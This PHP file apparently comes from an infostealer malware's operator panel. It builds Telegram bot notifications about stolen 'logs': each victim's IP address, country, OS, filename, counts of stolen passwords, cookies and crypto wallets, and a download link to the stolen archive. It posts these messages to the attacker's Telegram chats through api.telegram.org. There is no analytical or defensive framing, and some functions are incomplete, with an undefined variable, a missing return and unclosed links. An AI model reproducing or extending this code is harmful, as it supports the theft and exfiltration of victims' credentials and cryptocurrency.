<?php

/*
* Telegram_SendMessage
* 
*/
function Telegram_SendMessage($panel_domain, $logs_path, $telegram_token, $telegram_chatid, $link, $log_id, $type, $plugin = null, $file_name = null)
{
	if($telegram_token != "off")
	{
		// getting log info
		$log = getLog($link, $log_id);
		$log_info = json_decode($log["log_info"], true);
		
		$message_text = "";
		
		$ch = curl_init();
		$only_crypto = true;
		
		switch($type)
		{
			case "done":
				$message_text = GenerateTextForDoneMessage($panel_domain, $logs_path, $log, $log_info, $file_name);
				break;
				
			case "plugin":
				$message_text = GenerateTextForUpdatePluginMessage($panel_domain, $logs_path, $log, $log_info, "plugin", $plugin, $file_name);
				break;
				
			case "wallet":
				$message_text = GenerateTextForUpdatePluginMessage($panel_domain, $logs_path, $log, $log_info, "wallet", $plugin, $file_name);
				break;
				
			case "password":
				break;
				
			case "cookie":
				break;
				
			case "download_done":
				$message_text = GenerateTextForDownloadIsDone($panel_domain, $logs_path, $token);
				break;
		}
		
		$url = "https://api.telegram.org/bot"  .$telegram_token. "/sendMessage";
		
		$chat_ids = explode(",", $telegram_chatid);
		
		foreach($chat_ids as $chat_id)
		{
			$post_fields = array
			(
				'chat_id'   => $chat_id,
				'disable_web_page_preview' => false,
				'text'	=> $message_text,
				'parse_mode' => 'HTML',
			);
			
			curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);

			curl_exec($ch);
		}
	}
}

/*
* GenerateTextForDoneMessage
* 
*/
function GenerateTextForDoneMessage($panel_domain, $logs_path, $log, $log_info, $file_name)
{
	$array_cookies = preg_split('#\s+#', $log["array_cookies"]);
	
	$count_cookies = count($array_cookies);
	
	$response = "";
	
	$response .= "✅ Номер: ". $log["log_id"]."\n";
	$response .= "ОС: " .$log["system"] . " (". $log["architecture"] .")\n\n";
	$response .= "Имя файла: " .$file_name. "\n\n";

	$response .= "Страна: ". country2flag($log["iso"]). " (". $log["iso"] .")\n";
	$response .= "IP: ".$log["ip"] ."\n";
	$response .= "<b>Summary:</b>\n";
	$response .= "🔑". $log["count_passwords"]. " 🍪". $count_cookies ." 🧊". $log["count_wallets"];// ."\n\n";
	
	return $response;
}

/*
* GenerateTextForUpdatePluginMessage
* 
*/
function GenerateTextForUpdatePluginMessage($panel_domain, $logs_path, $log, $log_info, $type, $plugin, $file_name)
{
	$response = "";
	
	$response .= "⏳ Processing uploading #log_". $log["log_id"]." from ";
	$response .= $log["ip"] ." ". country2flag($log["iso"]) ."\n\n";
	
	switch($type)
	{
		case "plugin":
			$response .= "<b>Plugin</b>: ". $plugin ."\n";
			break;
			
		case "wallet":
			$response .= "<b>Wallet</b>: ". $plugin ."\n";
			break;
	}
	
	$response .= "<b>File</b>: ". $file_name ."\n\n";
	
	$response .= "<b>Download:</b> <a href=\"";
	$response .= generateLogLink($panel_domain, $logs_path, $log["filename"]);
	
	
	return $response;
}

/*
* GenerateTextForDownloadIsDone
* 
*/
function GenerateTextForDownloadIsDone($panel_domain, $logs_path, $token)
{
	$response = "";
	
	$response .= "👌 Your request for download logs is done\n";
	$response .= "Download:";
	
	$response .= "<b>Download:</b> <a href=\"";
	$response .= generateLogLink($panel_domain, $logs_path."/downloads/", $token.".zip");
	
}

/*
* country2flag
* 
*/
function country2flag(string $countryCode): string
{
    return (string) preg_replace_callback(
        '/./',
        static fn (array $letter) => mb_chr(ord($letter[0]) % 32 + 0x1F1E5),
        $countryCode
    );
}

/*
* generateLogLink
* 
*/
function generateLogLink($panel_domain, $logs_path, $log_filename)
{
	$response = "";
	
	$response .= $panel_domain;
	$response .= "/";
	$response .= $logs_path;
	$response .= "/";
	$response .= $log_filename;
	
	return $response;
}

?>